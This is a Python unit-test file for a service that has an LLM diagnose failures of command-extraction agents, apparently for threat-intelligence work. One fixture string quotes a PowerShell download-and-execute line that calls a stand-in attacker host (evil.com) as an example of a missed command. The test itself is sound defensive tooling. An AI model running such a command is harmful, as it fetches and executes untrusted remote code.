"""Tests for EvalDiagnosisService."""

import json
from unittest.mock import AsyncMock, Mock, patch

import pytest

from src.services.eval_diagnosis_service import (
    AGENT_TO_CONTRACT,
    CONTRACTS_DIR,
    EvalDiagnosisService,
)

pytestmark = pytest.mark.unit


def _make_llm_response(content: str) -> dict:
    """Build a mock LLM response dict matching request_chat return format."""
    return {"choices": [{"message": {"content": content}}]}


def _sample_diagnosis_json() -> str:
    """Return a valid diagnosis JSON string."""
    return json.dumps(
        {
            "summary": "Extractor missed 3 commands because the prompt does not cover PowerShell aliases.",
            "failure_category": "prompt_gap",
            "confidence": 0.82,
            "root_causes": [
                {
                    "cause": "PowerShell aliases (iwr, iex) not covered by extraction rules",
                    "evidence": "Article contains 'iwr http://evil.com | iex' but output omits it",
                    "severity": "high",
                }
            ],
            "recommendations": [
                {
                    "action": "Add PowerShell alias expansion note to SCOPE section",
                    "rationale": "Common in-the-wild pattern not currently addressed",
                    "priority": 1,
                }
            ],
            "contract_violations": ["SCOPE: Extract all single-line Windows commands with arguments"],
        }
    )


def _sample_bundle() -> dict:
    """Return a minimal eval bundle dict for testing."""
    return {
        "schema_version": "eval_bundle_v1",
        "bundle_id": "test-uuid-1234",
        "collected_at": "2026-05-01T00:00:00Z",
        "workflow": {
            "execution_id": 42,
            "agent_name": "CmdlineExtract",
            "expected_count": 7,
            "actual_count": 4,
            "evaluation_score": -3,
        },
        "llm_request": {"messages": [{"role": "user", "content": "test"}]},
        "llm_response": {"text_output": '{"cmdline_items": [], "count": 4}'},
        "inputs": [{"name": "article_text", "text": "Test article content"}],
        "extraction_context": {"parsed_result": {"items": [], "count": 4}},
        "execution_context": {"status": "completed", "infra_failed": False},
        "integrity": {"bundle_sha256": "abc123", "warnings": []},
    }


class TestLoadContract:
    """Test contract file loading."""

    def test_all_agent_contracts_exist(self):
        """Every agent in AGENT_TO_CONTRACT must map to an existing file."""
        for agent_name, filename in AGENT_TO_CONTRACT.items():
            filepath = CONTRACTS_DIR / filename
            assert filepath.exists(), f"Missing contract for {agent_name}: {filepath}"

    def test_standard_contract_exists(self):
        """The extractor-standard.md foundation contract must exist."""
        filepath = CONTRACTS_DIR / "extractor-standard.md"
        assert filepath.exists()

    def test_load_contract_returns_content(self):
        """Loading a valid contract returns non-empty string."""
        llm_service = Mock()
        service = EvalDiagnosisService(llm_service)
        text = service._load_contract_file("extractor-standard.md")
        assert len(text) > 100
        assert "Extractor" in text

    def test_load_missing_contract_returns_placeholder(self):
        """Loading a non-existent contract returns a placeholder, not an exception."""
        llm_service = Mock()
        service = EvalDiagnosisService(llm_service)
        text = service._load_contract_file("does-not-exist.md")
        assert "not found" in text


class TestBuildPrompt:
    """Test prompt construction."""

    def test_prompt_includes_contract_text(self):
        """The user message must include the contract and standard text."""
        llm_service = Mock()
        service = EvalDiagnosisService(llm_service)
        bundle = _sample_bundle()

        messages = service._build_diagnosis_prompt(
            bundle=bundle,
            agent_name="CmdlineExtract",
            standard_text="STANDARD RULES HERE",
            contract_text="CMDLINE CONTRACT HERE",
        )

        assert len(messages) == 2
        assert messages[0]["role"] == "system"
        assert messages[1]["role"] == "user"
        assert "STANDARD RULES HERE" in messages[1]["content"]
        assert "CMDLINE CONTRACT HERE" in messages[1]["content"]
        assert "CmdlineExtract" in messages[1]["content"]

    def test_prompt_includes_scoring_context(self):
        """The user message must include expected/actual/delta counts."""
        llm_service = Mock()
        service = EvalDiagnosisService(llm_service)
        bundle = _sample_bundle()

        messages = service._build_diagnosis_prompt(
            bundle=bundle,
            agent_name="CmdlineExtract",
            standard_text="std",
            contract_text="contract",
        )

        user_msg = messages[1]["content"]
        assert "Expected count: 7" in user_msg
        assert "Actual count: 4" in user_msg
        assert "Delta (actual - expected): -3" in user_msg

    def test_prompt_includes_bundle_json(self):
        """The user message must include the serialized bundle."""
        llm_service = Mock()
        service = EvalDiagnosisService(llm_service)
        bundle = _sample_bundle()

        messages = service._build_diagnosis_prompt(
            bundle=bundle,
            agent_name="CmdlineExtract",
            standard_text="std",
            contract_text="contract",
        )

        user_msg = messages[1]["content"]
        assert "eval_bundle_v1" in user_msg
        assert "test-uuid-1234" in user_msg


class TestParseDiagnosisResponse:
    """Test JSON response parsing with various formats."""

    def test_parses_valid_json(self):
        """Clean JSON string parses correctly."""
        llm_service = Mock()
        service = EvalDiagnosisService(llm_service)
        result = service._parse_diagnosis_response(_sample_diagnosis_json())

        assert result["failure_category"] == "prompt_gap"
        assert result["confidence"] == 0.82
        assert len(result["root_causes"]) == 1
        assert len(result["recommendations"]) == 1

    def test_parses_json_in_code_fences(self):
        """JSON wrapped in markdown code fences parses correctly."""
        llm_service = Mock()
        service = EvalDiagnosisService(llm_service)
        wrapped = f"```json\n{_sample_diagnosis_json()}\n```"
        result = service._parse_diagnosis_response(wrapped)

        assert result["failure_category"] == "prompt_gap"

    def test_parses_json_with_preamble(self):
        """JSON with leading prose (before the brace) parses correctly."""
        llm_service = Mock()
        service = EvalDiagnosisService(llm_service)
        with_preamble = f"Here is my analysis:\n\n{_sample_diagnosis_json()}"
        result = service._parse_diagnosis_response(with_preamble)

        assert result["failure_category"] == "prompt_gap"

    def test_handles_empty_response(self):
        """Empty response returns a fallback diagnosis."""
        llm_service = Mock()
        service = EvalDiagnosisService(llm_service)
        result = service._parse_diagnosis_response("")

        assert result["failure_category"] == "infrastructure"
        assert result["confidence"] == 0.0
        assert "Empty response" in result["summary"]

    def test_handles_unparseable_response(self):
        """Non-JSON response returns a fallback diagnosis."""
        llm_service = Mock()
        service = EvalDiagnosisService(llm_service)
        result = service._parse_diagnosis_response("This is not JSON at all")

        assert result["failure_category"] == "infrastructure"
        assert "parse error" in result["summary"].lower()

    def test_handles_partial_json(self):
        """JSON missing some fields still returns what it can."""
        llm_service = Mock()
        service = EvalDiagnosisService(llm_service)
        partial = json.dumps(
            {
                "summary": "Partial result",
                "failure_category": "input_noise",
                "confidence": 0.5,
            }
        )
        result = service._parse_diagnosis_response(partial)

        assert result["summary"] == "Partial result"
        assert result["failure_category"] == "input_noise"
        assert result["root_causes"] == []
        assert result["recommendations"] == []


class TestDiagnoseBundle:
    """Test the full diagnose_bundle flow with mocked LLM."""

    @pytest.mark.asyncio
    async def test_diagnose_returns_structured_result(self):
        """Full diagnosis flow returns expected envelope structure."""
        llm_service = Mock()
        llm_service.request_chat = AsyncMock(return_value=_make_llm_response(_sample_diagnosis_json()))
        service = EvalDiagnosisService(llm_service)
        bundle = _sample_bundle()

        result = await service.diagnose_bundle(
            bundle=bundle,
            agent_name="CmdlineExtract",
            provider="anthropic",
            model_name="claude-sonnet-4-20250514",
        )

        # Envelope fields
        assert "diagnosis_id" in result
        assert result["execution_id"] == 42
        assert result["agent_name"] == "CmdlineExtract"
        assert result["provider_used"] == "anthropic"

        # Scoring context
        assert result["score_context"]["expected_count"] == 7
        assert result["score_context"]["actual_count"] == 4
        assert result["score_context"]["delta"] == -3

        # Findings from LLM
        assert result["failure_category"] == "prompt_gap"
        assert len(result["root_causes"]) == 1

    @pytest.mark.asyncio
    async def test_diagnose_calls_request_chat_correctly(self):
        """Verify the LLM call is made with correct provider and parameters."""
        llm_service = Mock()
        llm_service.request_chat = AsyncMock(return_value=_make_llm_response(_sample_diagnosis_json()))
        service = EvalDiagnosisService(llm_service)
        bundle = _sample_bundle()

        await service.diagnose_bundle(
            bundle=bundle,
            agent_name="CmdlineExtract",
            provider="openai",
            model_name="gpt-4o",
            temperature=0.1,
        )

        llm_service.request_chat.assert_called_once()
        call_kwargs = llm_service.request_chat.call_args.kwargs
        assert call_kwargs["provider"] == "openai"
        assert call_kwargs["model_name"] == "gpt-4o"
        assert call_kwargs["temperature"] == 0.1
        assert call_kwargs["max_tokens"] == 3500
        assert "eval_diagnosis" in call_kwargs["failure_context"]


class TestSaveDiagnosis:
    """Test diagnosis file persistence."""

    def test_saves_json_file(self, tmp_path):
        """Diagnosis is saved as JSON to the expected path."""
        llm_service = Mock()
        service = EvalDiagnosisService(llm_service)

        diagnosis = {
            "diagnosis_id": "abcd1234-5678-9012-3456-789012345678",
            "execution_id": 99,
            "agent_name": "RegistryExtract",
            "summary": "Test save",
            "failure_category": "correct_behavior",
            "confidence": 0.95,
            "root_causes": [],
            "recommendations": [],
            "contract_violations": [],
        }

        with patch("src.services.eval_diagnosis_service.DIAGNOSES_DIR", tmp_path):
            filepath = service.save_diagnosis(diagnosis)

        assert filepath.exists()
        assert "99_RegistryExtract_abcd1234" in filepath.name
        saved = json.loads(filepath.read_text())
        assert saved["execution_id"] == 99
        assert saved["agent_name"] == "RegistryExtract"
